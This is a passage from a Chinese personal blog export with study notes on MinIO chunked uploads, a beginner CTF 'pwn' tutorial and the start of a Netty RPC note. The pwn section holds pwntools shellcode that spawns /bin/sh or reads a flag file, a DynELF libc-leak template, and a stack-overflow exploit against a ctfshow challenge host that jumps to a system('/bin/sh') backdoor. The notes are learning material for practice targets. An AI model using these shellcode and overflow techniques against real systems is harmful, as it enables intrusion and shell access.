<h3 id="断点续传-测试MinIO合并分块"><a href="#断点续传-测试MinIO合并分块" class="headerlink" title="断点续传-测试MinIO合并分块"></a>断点续传-测试MinIO合并分块</h3><p>1、前端对文件进行分块。<br>2、前端上传分块文件前请求媒资服务检查文件是否存在，如果已经存在则不再上传。<br>3、如果分块文件不存在则前端开始上传<br>4、前端请求媒资服务上传分块。<br>5、媒资服务将分块上传至MinlO</p>
<p>使用MinIO提供的sdk进行分开合并（MinIO默认最小分块合并大小为5M）</p>
<p>对应commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/1feba5efce5030342d5a30ae42fb294b8905ad04">MinIO上传分片文件和合并分片测试代码编写 · realikun404&#x2F;xuecheng-plus-project@1feba5e (github.com)</a></p>
<p><a href="https://blog.csdn.net/sinat_32849897/article/details/108989208">每日一课 | 示例 Java 8 Stream 的 iterate 处理-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_39629277/article/details/83108585">Java8新特性Stream之Collectors(toList()、toSet()、toCollection()、joining()、partitioningBy()、collectingAndT)_stream().collect(collectors.toset(-CSDN博客</a></p>
<h3 id="业务代码上传分块、合并分块"><a href="#业务代码上传分块、合并分块" class="headerlink" title="业务代码上传分块、合并分块"></a>业务代码上传分块、合并分块</h3><p>直接cv的没手敲</p>
<p>对应commit：<a href="https://github.com/realikun404/xuecheng-plus-project/commit/43fd0419079f2e0e71ddada80d29b43042d2c372">业务代码上传分块、合并分块 · realikun404&#x2F;xuecheng-plus-project@43fd041 (github.com)</a></p>
<p>前端对文件分块的大小为5MB，SpringBoot web默认上传文件的大小限制为1MB，这里需要在media-api工程修改配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring:</span><br><span class="line">  servlet:</span><br><span class="line">    multipart:</span><br><span class="line">      max-file-size: 50MB</span><br><span class="line">      max-request-size: 50MB</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>后续：因为这个项目不打算写在简历上，只是打算看看视频，了解下分布式的写法，后面就不跟着写了</p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>项目</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn入门</title>
    <url>/2023/04/18/pwn%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/gd_9988/article/details/106744216">ctfshow-pwn新手系列_ctfshow pwn_Rocl5的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/m0_46483584/article/details/110259127">ctfshow pwn题学习笔记_Scarehehe的博客-CSDN博客</a></p>
<span id="more"></span>

<h2 id="pwn中的保护"><a href="#pwn中的保护" class="headerlink" title="pwn中的保护"></a>pwn中的保护</h2><p><a href="https://blog.csdn.net/qq_44108455/article/details/104985351">pwn学习—保护机制_gclome的博客-CSDN博客</a></p>
<p><a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p>
<h2 id="pwntools的使用"><a href="#pwntools的使用" class="headerlink" title="pwntools的使用"></a>pwntools的使用</h2><p><a href="https://blog.csdn.net/A951860555/article/details/110990925">pwntools工具的使用（随时更新中…）___lifanxin的博客-CSDN博客</a></p>
<p>我们本地写一个猜数游戏进行测试用来学习</p>
<p>c：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> secretNumber, userGuess;</span><br><span class="line">    <span class="type">int</span> attempts = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化随机数生成器</span></span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成一个 1 到 10000 的随机数</span></span><br><span class="line">    secretNumber = rand() % <span class="number">10000</span> + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;猜一个 1 到 10000 之间的数字。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环，直到用户猜到正确的数字</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;input your num:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;userGuess);</span><br><span class="line">        attempts++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (userGuess == secretNumber) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;success！\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;tyr %d times。\n&quot;</span>, attempts);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (userGuess &lt; secretNumber) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;low\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;big\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>linux：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie -m32 guessNum.c -o guessNum</span><br></pre></td></tr></table></figure>

<p>在 GCC 编译器中，<code>-m32</code> 是一个编译选项，它指示编译器为 32 位目标架构生成代码。换句话说，它会告诉 GCC 生成 32 位可执行文件，而不是默认的 64 位可执行文件（假设你的系统默认是 64 位的）。</p>
<p>当使用 <code>-m32</code> 选项编译程序时，确保已安装了 32 位库和开发工具。在某些操作系统上，可能需要额外安装这些库和工具。例如，在 Ubuntu 上，你需要安装 <code>gcc-multilib</code> 和 <code>g++-multilib</code> 包，以便在 64 位系统上编译 32 位程序。</p>
<p>玩游戏：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">game = process(<span class="string">&#x27;./guessNum&#x27;</span>)</span><br><span class="line"></span><br><span class="line">game.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lower_bound = <span class="number">1</span></span><br><span class="line">upper_bound = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    guess = (lower_bound + upper_bound) // <span class="number">2</span></span><br><span class="line">    response = game.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;input&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">	game.sendline(<span class="built_in">str</span>(guess))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;low&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        lower_bound = guess + <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;big&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        upper_bound = guess - <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;sucess:&quot;</span>, guess)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error:&quot;</span>, response)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>结果:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Desktop/pwnremote$ python exp.py </span><br><span class="line">[+] Starting local process &#x27;./guessNum&#x27;: pid 3617</span><br><span class="line">(&#x27;sucess:&#x27;, 9039)</span><br><span class="line">[*] Process &#x27;./guessNum&#x27; stopped with exit code 0 (pid 3617)</span><br><span class="line">ubuntu@ubuntu:~/Desktop/pwnremote$ python exp.py </span><br><span class="line">[+] Starting local process &#x27;./guessNum&#x27;: pid 3656</span><br><span class="line">(&#x27;sucess:&#x27;, 1289)</span><br><span class="line">[*] Process &#x27;./guessNum&#x27; stopped with exit code 0 (pid 3656)</span><br></pre></td></tr></table></figure>



<h3 id="引入pwntools库"><a href="#引入pwntools库" class="headerlink" title="引入pwntools库"></a>引入pwntools库</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 虽然不太符合pylint代码规范</span></span><br><span class="line"><span class="comment"># 但官方也推荐这样引用</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>

<h3 id="绑定要处理的程序"><a href="#绑定要处理的程序" class="headerlink" title="绑定要处理的程序"></a>绑定要处理的程序</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 远程</span></span><br><span class="line"><span class="comment"># remote(ip/hostname, port)</span></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地</span></span><br><span class="line"><span class="comment"># 注意process中参数一定要有./</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="设置上下文环境"><a href="#设置上下文环境" class="headerlink" title="设置上下文环境"></a>设置上下文环境</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置上下文环境主要用于一些需要上下文的漏洞利用</span></span><br><span class="line"><span class="comment"># 比如：shellcode的生成</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置操作系统</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"><span class="comment"># 设置32位的体系架构 </span></span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line"><span class="comment"># 设置64位的体系架构</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># 打印交互中的输入和输出</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># 也可以直接这样写</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, lod_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空之前的上下文</span></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># 清空之前的上下文并设置为64位的体系架构</span></span><br><span class="line">context.clear(arch=<span class="string">&quot;amd64&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="获取程序输出"><a href="#获取程序输出" class="headerlink" title="获取程序输出"></a>获取程序输出</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recv()        <span class="comment"># 默认接受最大为4096字节的输出</span></span><br><span class="line">p.recvline()    <span class="comment"># 接受程序的一行输出</span></span><br><span class="line">p.recvall()     <span class="comment"># 接受程序的当前全部输出，直到遇到EOF</span></span><br><span class="line"><span class="comment"># 直到接收到\n为止，drop=True表示丢弃\n，buf为接收到的输出但不包括丢弃的\n</span></span><br><span class="line">buf = p.recvuntil(<span class="string">&quot;\n&quot;</span>, drop=<span class="literal">True</span>)   </span><br></pre></td></tr></table></figure>

<h3 id="payload的构造"><a href="#payload的构造" class="headerlink" title="payload的构造"></a>payload的构造</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pad = cyclic(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># 可以用上面的代码替代传统的构造方式 pad = b&quot;A&quot; * 0x10</span></span><br><span class="line"><span class="comment"># 其结果为 b&#x27;aaaabaaacaaadaaa&#x27;</span></span><br><span class="line">offset = cyclic_find(<span class="string">b&quot;daaa&quot;</span>)  <span class="comment"># 找到当前pad的偏移值</span></span><br></pre></td></tr></table></figure>

<h3 id="实现输入"><a href="#实现输入" class="headerlink" title="实现输入"></a>实现输入</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;hello!&#x27;</span>      <span class="comment"># python3，payload为字节类型</span></span><br><span class="line">p.sendline(payload)      <span class="comment"># 输入hello! + \n</span></span><br><span class="line">p.send(payload)          <span class="comment"># 输入hello!</span></span><br><span class="line">p.sendafter(<span class="string">&quot;test&quot;</span>, payload)      <span class="comment"># 在接受到test后才发送payload</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;test&quot;</span>, payload)  <span class="comment"># 在接受到test后才发送payload + \n</span></span><br></pre></td></tr></table></figure>

<h3 id="实现交互"><a href="#实现交互" class="headerlink" title="实现交互"></a>实现交互</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开启和程序交互的终端</span></span><br><span class="line"><span class="comment"># 一般用于获取到shell的情况</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="获取程序或者libc中的信息"><a href="#获取程序或者libc中的信息" class="headerlink" title="获取程序或者libc中的信息"></a>获取程序或者libc中的信息</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pro = ELF(<span class="string">&quot;./program&quot;</span>)  <span class="comment"># 加载样本</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc&quot;</span>)    <span class="comment"># 加载libc</span></span><br><span class="line"></span><br><span class="line">read_addr = pro.symbols[<span class="string">&quot;read&quot;</span>]  <span class="comment"># 获取read函数地址</span></span><br><span class="line">read_plt = pro.plt[<span class="string">&quot;read&quot;</span>]       <span class="comment"># 获取read的plt表地址，内容等于symbols[&quot;read&quot;]</span></span><br><span class="line">read_got = pro.got[<span class="string">&quot;read&quot;</span>]       <span class="comment"># 获取read的got表地址</span></span><br><span class="line"><span class="comment"># search的参数为字节类型</span></span><br><span class="line"><span class="comment"># 获取字符串的位置</span></span><br><span class="line">str_addr = <span class="built_in">next</span>(pro.search(<span class="string">b&quot;str&quot;</span>))</span><br><span class="line"></span><br><span class="line">read_offset = libc.symbols[<span class="string">&quot;read&quot;</span>]  <span class="comment"># 获取libc中read的固定偏移值</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>)) <span class="comment"># 获取/bin/sh的位置</span></span><br></pre></td></tr></table></figure>

<h3 id="shellcode的生成"><a href="#shellcode的生成" class="headerlink" title="shellcode的生成"></a>shellcode的生成</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 32位的shellcode</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置上下文</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">code = shellcraft.sh()  <span class="comment"># 汇编代码</span></span><br><span class="line">code = asm(code)        <span class="comment"># opcode，payload中都使用这个</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64位的shellcode</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置上下文</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">code = shellcraft.sh()  <span class="comment"># 同上</span></span><br><span class="line">code = asm(code)        <span class="comment"># 同上</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上面是执行execve(&quot;/bin/sh\x00&quot;)的shellcode</span></span><br><span class="line"><span class="comment"># 下面展示直接读取flag文件然后打印的shellcode</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">mmap = <span class="number">0x12345678</span>  <span class="comment"># 可读可写内存区域</span></span><br><span class="line"></span><br><span class="line">code = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">code += shellcraft.read(<span class="number">3</span>, mmap, <span class="number">0x50</span>)</span><br><span class="line">code += shellcraft.write(<span class="number">1</span>, mmap, <span class="number">0x50</span>)</span><br><span class="line">code = asm(code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更简洁的写法</span></span><br><span class="line">code = asm(shellcraft.cat(<span class="string">&quot;flag&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>执行，加了print base64</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Desktop/pwnremote$ python exp.py </span><br><span class="line">    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line">    /* push &#x27;/bin///sh\x00&#x27; */</span><br><span class="line">    push 0x68</span><br><span class="line">    push 0x732f2f2f</span><br><span class="line">    push 0x6e69622f</span><br><span class="line">    mov ebx, esp</span><br><span class="line">    /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">    /* push &#x27;sh\x00\x00&#x27; */</span><br><span class="line">    push 0x1010101</span><br><span class="line">    xor dword ptr [esp], 0x1016972</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx /* null terminate */</span><br><span class="line">    push 4</span><br><span class="line">    pop ecx</span><br><span class="line">    add ecx, esp</span><br><span class="line">    push ecx /* &#x27;sh\x00&#x27; */</span><br><span class="line">    mov ecx, esp</span><br><span class="line">    xor edx, edx</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* 0xb */</span><br><span class="line">    pop eax</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">[DEBUG] cpp -C -nostdinc -undef -P -I/home/ubuntu/.local/lib/python2.7/site-packages/pwnlib/data/includes /dev/stdin</span><br><span class="line">[DEBUG] Assembling</span><br><span class="line">    .section .shellcode,&quot;awx&quot;</span><br><span class="line">    .global _start</span><br><span class="line">    .global __start</span><br><span class="line">    .p2align 2</span><br><span class="line">    _start:</span><br><span class="line">    __start:</span><br><span class="line">    .intel_syntax noprefix</span><br><span class="line">        /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line">        /* push &#x27;/bin///sh\x00&#x27; */</span><br><span class="line">        push 0x68</span><br><span class="line">        push 0x732f2f2f</span><br><span class="line">        push 0x6e69622f</span><br><span class="line">        mov ebx, esp</span><br><span class="line">        /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">        /* push &#x27;sh\x00\x00&#x27; */</span><br><span class="line">        push 0x1010101</span><br><span class="line">        xor dword ptr [esp], 0x1016972</span><br><span class="line">        xor ecx, ecx</span><br><span class="line">        push ecx /* null terminate */</span><br><span class="line">        push 4</span><br><span class="line">        pop ecx</span><br><span class="line">        add ecx, esp</span><br><span class="line">        push ecx /* &#x27;sh\x00&#x27; */</span><br><span class="line">        mov ecx, esp</span><br><span class="line">        xor edx, edx</span><br><span class="line">        /* call execve() */</span><br><span class="line">        push 11 /* 0xb */</span><br><span class="line">        pop eax</span><br><span class="line">        int 0x80</span><br><span class="line">[DEBUG] /usr/bin/x86_64-linux-gnu-as -32 -o /tmp/pwn-asm-IlAesT/step2 /tmp/pwn-asm-IlAesT/step1</span><br><span class="line">[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-IlAesT/step3 /tmp/pwn-asm-IlAesT/step4</span><br><span class="line">amhoLy8vc2gvYmluieNoAQEBAYE0JHJpAQExyVFqBFkB4VGJ4THSagtYzYA=</span><br></pre></td></tr></table></figure>

<h3 id="DynELF泄露libc"><a href="#DynELF泄露libc" class="headerlink" title="DynELF泄露libc"></a>DynELF泄露libc</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下面展示的是DynELF的使用模板</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">	<span class="comment"># 这里的代码比较抽象</span></span><br><span class="line">	<span class="comment"># 其实目的就是利用能够回显字符的函数泄露addr，返回地址为start</span></span><br><span class="line">	<span class="comment"># data接受的数据只能是回显的addr地址上的内容，将空字符处理为\x00</span></span><br><span class="line">	payload = padding + addr + start</span><br><span class="line">	p.send(payload)</span><br><span class="line">	data = p.recv()</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造DynELF实例，第一个参数为leak函数，第二个为题目的ELF对象</span></span><br><span class="line">d = DynELF(leak, elf=pro)</span><br><span class="line">system = d.lookup(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;libc&quot;</span>)  <span class="comment"># 泄露出system的地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system ====&gt; &quot;</span>, system, <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实战链接</span></span><br><span class="line"><span class="comment"># https://blog.csdn.net/A951860555/article/details/111638914</span></span><br><span class="line"><span class="comment"># 详细的用法讲解，包括write/puts/printf三个函数的用法和细节处理</span></span><br><span class="line"><span class="comment"># https://www.anquanke.com/post/id/85129</span></span><br></pre></td></tr></table></figure>

<p>后面的不太看得懂了，先不管</p>
<h2 id="pwn02"><a href="#pwn02" class="headerlink" title="pwn02"></a>pwn02</h2><p>main函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;stack happy!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;32bits\n&quot;</span>);</span><br><span class="line">  <span class="built_in">pwnme</span>();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExiting&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pwnme函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">9</span>]; <span class="comment">// [esp+Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  fgets(s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>fgets</code>处存在栈溢出,<code>s</code>距离ebp为0x9,那么覆盖到返回地址的长度还要再加上0x4，然后写0804850F</p>
<p>后门地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0804850F                               public stack</span><br><span class="line">.text:0804850F                               stack proc near</span><br><span class="line">.text:0804850F                               ; __unwind &#123;</span><br><span class="line">.text:0804850F 55                            push    ebp</span><br><span class="line">.text:08048510 89 E5                         mov     ebp, esp</span><br><span class="line">.text:08048512 83 EC 08                      sub     esp, 8</span><br><span class="line">.text:08048515 83 EC 0C                      sub     esp, 0Ch</span><br><span class="line">.text:08048518 68 30 86 04 08                push    offset command                  ; &quot;/bin/sh&quot;</span><br><span class="line">.text:0804851D E8 8E FE FF FF                call    _system</span><br><span class="line">.text:0804851D</span><br><span class="line">.text:08048522 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:08048525 90                            nop</span><br><span class="line">.text:08048526 C9                            leave</span><br><span class="line">.text:08048527 C3                            retn</span><br><span class="line">.text:08048527                               ; &#125; // starts at 804850F</span><br><span class="line">.text:08048527</span><br><span class="line">.text:08048527                               stack endp</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28109</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0804850F</span>)</span><br><span class="line"><span class="built_in">print</span>(payload) <span class="comment"># aaaaaaaaaaaaa\x0f\x04</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn-03"><a href="#pwn-03" class="headerlink" title="pwn 03"></a>pwn 03</h2><p>查看保护</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Desktop/pwnremote$ checksec stack1</span><br><span class="line">[*] &#x27;/home/ubuntu/Desktop/pwnremote/stack1&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p><strong>可以用<code>puts</code>函数泄露出任意函数的<code>got</code>表地址,从而泄露libc,就可以根据相对偏移getshell</strong></p>
<p>上面这句话没懂，搜下相关东西：</p>
<p><a href="https://blog.csdn.net/Morphy_Amo/article/details/121845113">【PWN学习】如何获取libc基址_查看libc基址_Morphy_Amo的博客-CSDN博客</a></p>
<p><a href="https://www.freesion.com/article/5901691025/">CTF中的PWN——绕canary防护3（选择项+puts带出canary+泄露函数地址计算基地址） - 灰信网（软件开发博客聚合） (freesion.com)</a></p>
<p>明天继续</p>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>手写rpc</title>
    <url>/2024/09/06/project_rpc/</url>
    <content><![CDATA[<p>参考<a href="https://www.yuque.com/snailclimb/gsmusc/ov6225">01 什么是RPC？原理是什么？ (yuque.com)</a></p>
<p>[toc]</p>
<h2 id="中文文档："><a href="#中文文档：" class="headerlink" title="中文文档："></a>中文文档：</h2><p>先跟着敲下代码有个数</p>
<p><a href="https://waylau.gitbooks.io/netty-4-user-guide/content/">Introduction · Netty 4.x User Guide 中文翻译《Netty 4.x 用户指南》 (gitbooks.io)</a></p>
<p><a href="https://segmentfault.com/q/1010000005026161">java - netty中的ReferenceCountUtil.release()方法具体作用是什么？ - SegmentFault 思否</a></p>
<p><a href="https://www.cnblogs.com/iou123lg/p/12723518.html">Netty：ChannelFuture - lingjiango - 博客园 (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/gorden5566/article/details/121551002#:~:text=%E6%9C%AC%E6%96%87%E8%AF%A6%E7%BB%86%E5%89%96%E6%9E%90#:~:text=%E6%9C%AC%E6%96%87%E8%AF%A6%E7%BB%86%E5%89%96%E6%9E%90">netty中ChannelFuture.sync()的作用是什么？_channelfuture sync()-CSDN博客</a></p>
<span id="more"></span>



<p><a href="https://cloud.tencent.com/developer/article/2319794">【Netty】「萌新入门」（五）掌握 Pipeline 和 ChannelHandler：构建高效网络应用程序的关键-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p>下面的代码调整顺序，使用telnet当客户端学习pipeline执行顺序</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xccstu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.netty.bootstrap.ServerBootstrap;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.*;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.nio.NioEventLoopGroup;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.nio.NioServerSocketChannel;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.nio.NioSocketChannel;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestPipeline</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span 